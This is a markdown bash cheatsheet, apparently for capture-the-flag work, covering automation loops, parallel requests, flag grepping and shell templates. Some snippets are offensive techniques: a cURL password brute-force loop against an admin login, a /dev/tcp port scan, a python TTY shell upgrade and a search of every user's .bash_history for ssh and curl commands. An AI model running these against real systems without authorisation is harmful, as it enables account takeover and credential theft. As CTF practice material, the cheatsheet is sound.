# 🔄 Bash Automation Cheatsheet
*“Automate the boring stuff, find the flag faster.”*

## 🧪 Brute-Force & Wordlist Loops

### 🔐 Password Brute-Forcing via cURL
```bash
while read pass; do
  echo "Trying password: $pass"
  curl -s -X POST -d "user=admin&pass=$pass" http://TARGET/login | grep -q "Welcome" && echo "[+] Password Found: $pass" && break
done < rockyou.txt
```

### 🔁 Basic For Loop - Port Scanner
```bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo "Port $port is open"
done
```

### 📜 Read File Line by Line (IFS-safe)
```bash
while IFS= read -r line; do
  echo "Line: $line"
done < wordlist.txt
```

---

## ⚡ Speed & Parallelism

### 🚀 Parallel Requests with `xargs`
```bash
cat urls.txt | xargs -n 1 -P 10 -I{} curl -s {} | grep "flag"
```

### 🧵 Multi-threaded Dirsearch Example
```bash
for endpoint in $(cat endpoints.txt); do
  (
    curl -s "http://target/$endpoint" | grep "flag" && echo "Found in $endpoint"
  ) &
done
wait
```

---

## 🧰 File Processing & Automation

### 🔎 Grep Flags in All Files Recursively
```bash
grep -rEi 'flag\{.*\}' . 2>/dev/null
```

### 🧹 Clean Output and Save
```bash
grep -r "flag" . 2>/dev/null | tee results.txt
```

---

## 🐚 Bash Templates

### ✅ If-Else in One Line
```bash
[ -f /etc/passwd ] && echo "File exists" || echo "Nope"
```

### 🧪 Function Template
```bash
function scan_host() {
  ip=$1
  echo "Scanning $ip..."
  nmap -sV $ip -oN $ip-scan.txt
}
scan_host 10.10.10.10
```

---

## 🐍 Python Inside Bash

### 🐚 Upgrade Shell with Python (TTY)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🗂️ One-Liner Cheats

### 🧹 Remove ANSI Color Codes
```bash
cat file.txt | sed 's/\x1b\[[0-9;]*m//g'
```

### 🕵️ Scan All Users' `.bash_history`
```bash
find /home -name ".bash_history" -exec grep -H "ssh\|curl\|wget" {} \;
```

---

## 🧩 Tips

- Combine with `&&`, `||`, and `|` to chain smart logic.
- Redirect outputs cleanly using `>`, `>>`, `2>/dev/null`.

---

> 🧠 “Automation is to hacking what multitools are to survival — essential.”  

